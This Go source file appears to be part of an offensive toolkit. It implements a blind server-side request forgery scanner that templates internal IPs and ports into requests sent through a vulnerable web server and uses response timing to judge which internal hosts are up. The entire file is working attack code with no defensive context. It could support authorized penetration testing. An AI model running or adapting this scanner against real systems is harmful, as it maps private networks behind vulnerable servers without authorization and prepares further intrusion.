package exploit

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"time"
)

var ports = []int{22, 53, 80, 139, 443, 3000, 3001, 3306, 3389, 8000, 8080, 8443}

type SSRFRequestInfo struct {
	URL             string
	HTTPMethod      string
	PostBody        string
	Headers         map[string]string
	ProcessResponse func(resp *http.Response, duration time.Duration) bool
}

type BlindSSRFExploitPortScan struct {
	Exploit
	SSRFReqInfo *SSRFRequestInfo
}

func (b *BlindSSRFExploitPortScan) createRequest(ip string, port int) *http.Request {
	var postBody = []byte(
		fmt.Sprintf(
			b.SSRFReqInfo.PostBody,
			ip,
			port,
		))
	req, _ := http.NewRequest(b.SSRFReqInfo.HTTPMethod, b.SSRFReqInfo.URL, bytes.NewBuffer(postBody))
	for header, value := range b.SSRFReqInfo.Headers {
		req.Header.Set(header, value)
	}

	return req
}

type BlindSSRFExploitHostScan struct {
	BlindSSRFExploitPortScan
}

func (e *BlindSSRFExploitHostScan) Run(hosts []string) {
	e.Banner()

	hostQueue := make(chan string)

	for i := 0; i < 10; i++ {
		go func() {
			for host := range hostQueue {
				if e.IsHostUp(host) {
					fmt.Printf("\r%s UP               \n", host)
				} else {
					fmt.Printf("\r%s UNREACHABLE", host)
				}
			}
		}()
	}

	for _, host := range hosts {
		hostQueue <- host
	}
}

func (e *BlindSSRFExploitHostScan) IsHostUp(ip string) bool {

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	cf := []context.CancelFunc{}
	c1 := make(chan *http.Response)
	for _, port := range ports {

		req := e.createRequest(ip, port)

		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		sctx := context.WithValue(ctx, "startTime", time.Now())

		cf = append(cf, cancel)

		reqWithDeadline := req.WithContext(sctx)

		go func() {

			resp, err := client.Do(reqWithDeadline)
			if err != nil {
				c1 <- nil
				return
			}

			c1 <- resp
		}()
	}

	status := false

	for range ports {
		res := <-c1
		if res != nil {
			duration := time.Since(res.Request.Context().Value("startTime").(time.Time))
			if e.BlindSSRFExploitPortScan.SSRFReqInfo.ProcessResponse(res, duration) {
				status = true
				for _, cFun := range cf {
					cFun()
				}
				break
			}
		}
	}

	return status
}
